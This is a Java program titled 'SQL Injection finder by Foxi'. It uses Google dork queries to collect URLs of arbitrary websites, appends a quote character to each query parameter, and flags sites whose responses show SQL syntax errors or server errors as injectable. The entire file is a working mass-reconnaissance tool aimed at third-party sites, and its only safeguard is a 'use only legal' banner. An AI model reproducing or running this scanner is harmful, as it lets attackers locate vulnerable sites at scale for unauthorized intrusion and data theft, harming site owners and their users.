

import com.google.gson.Gson;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.net.UnknownHostException;
import java.util.HashSet;
import java.util.Scanner;
import javax.net.ssl.SSLHandshakeException;
import javax.net.ssl.SSLProtocolException;


public class SQLi {

    
    public static void main(String[] args) throws Exception {

        System.out.println("*******************************");
        System.out.println("SQL Injection finder by Foxi.");
        System.out.println("No warrenty, use only legal!");
        System.out.println("*******************************");
        
        
         int end = 0;
         int start = 0;
        System.out.println(" 1/3 Insert dork string      e.g. inurl:.php?id= ");
        Scanner s = new Scanner(System.in);
        String dork = s.next();
        System.out.println(" 2/3 Insert starting page from Google normaly 0 ");
        String startString = s.next();
         
        if(startString.matches("[0-9]+")){
            start = Integer.parseInt(startString);
        }else{
            while(!startString.matches("[0-9]+")){
                System.out.println("2/3 Insert starting page from Google normaly 0 ");
                startString = s.next();
             }
            start = Integer.parseInt(startString);
        }
        
        
        System.out.println("3/3 Insert how many pages you want to search ");
       
        String endString = s.next();
        if(endString.matches("[0-9]+")){
            end = Integer.parseInt(endString);
        }else{
            while(!endString.matches("[0-9]+")){
                System.out.println("3/3 Insert how many pages you want to search ");
                endString = s.next();                
            }
            end = Integer.parseInt(endString);
        }
        
        HashSet<String> set = new HashSet<>();

        for (int i = start; i < end; i = i + 4) {
            String address = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&start=" + i + "&q=";

            String query = dork;
            String charset = "UTF-8";
            //-inurl:"/index.php?option=com_content" inurl:"/index.php?option=" inurl:id
            URL url = new URL(address + URLEncoder.encode(query, charset));
            Reader reader = new InputStreamReader(url.openStream(), charset);
            GoogleResults results = new Gson().fromJson(reader, GoogleResults.class);

            // Show title and URL of each results
            for (int m = 0; m <= 3; m++) {
                String searchUrl = URLDecoder.decode(results.getResponseData().getResults().get(m).getUrl(), charset).replaceAll("((?:\\?|&)[^=]*)=([^&]*)", "$1=$2'");
                try {
                    URL search = new URL(searchUrl);
                    HttpURLConnection connectionURL = (HttpURLConnection) search.openConnection();

                    if (connectionURL.getResponseCode() != 200) {

                        if (connectionURL.getResponseCode() == 500) {
                            set.add(" maybe because of error code " + searchUrl);
                            continue;
                        }

                        System.out.println(connectionURL.getResponseCode() + " Error don't care! about " + connectionURL.getURL().toString());
                        continue;
                    }

                    InputStream con = connectionURL.getInputStream();

                    BufferedReader in = new BufferedReader(new InputStreamReader(con));

                    String line = null;

                    while ((line = in.readLine()) != null) {
                        if (line.toUpperCase().contains("SQL SYNTAX")) {
                            set.add(searchUrl);
                        }
                        if (line.toUpperCase().contains("ADODB.STREAM ERROR")) {
                            set.add(searchUrl);
                        }

                    }
                } catch (Exception e) {
                    if (e instanceof UnknownHostException) {
                        System.out.println(((UnknownHostException) e).getMessage() + " is not answering continue ");
                        continue;
                    }
                    if (e instanceof SSLHandshakeException) {
                        System.out.println(((SSLHandshakeException) e).getMessage() + " no SSL Handshake ");
                        continue;
                    }
                    if (e instanceof ProtocolException) {
                        System.out.println(((ProtocolException) e).getMessage() + " protocol error ");
                        continue;
                    }
                    if (e instanceof SSLProtocolException) {
                        System.out.println(((SSLProtocolException) e).getMessage() + " SSL protocol error ");
                        continue;
                    }
                    if (e instanceof IOException) {
                        System.out.println(((IOException) e).getMessage() + " I/O exeption ");
                        continue;
                    }
                    e.printStackTrace();
                }
            }
        }

        set.stream().forEach((url) -> {
            System.out.println("Found:" + url);
        });
    }

}
